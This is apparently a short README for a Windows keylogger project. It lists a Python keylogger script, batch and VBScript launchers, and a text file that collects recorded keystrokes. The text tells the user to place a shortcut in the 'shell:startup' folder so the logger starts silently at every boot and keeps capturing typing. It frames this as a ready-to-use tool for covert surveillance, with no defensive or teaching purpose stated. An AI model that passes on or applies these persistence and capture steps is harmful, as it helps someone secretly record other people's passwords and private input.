There are Four Files:-
1. Keylogger.pyw - This file has the main code.
2. script.bat - This is the Executable file.
3. scipt.vbs - This file has code.
4. Keyloger.txt - This file has all the recorded keystrokes.

Firstly create a shortcut of script.bat file and paste it in "shell:startup" Folder in windows.
Run only script.bat shortcut file. Whenever the system Turn off and Turn on againit will automatically executes and you only needs to see the keystrokes in keylogger.txt file.
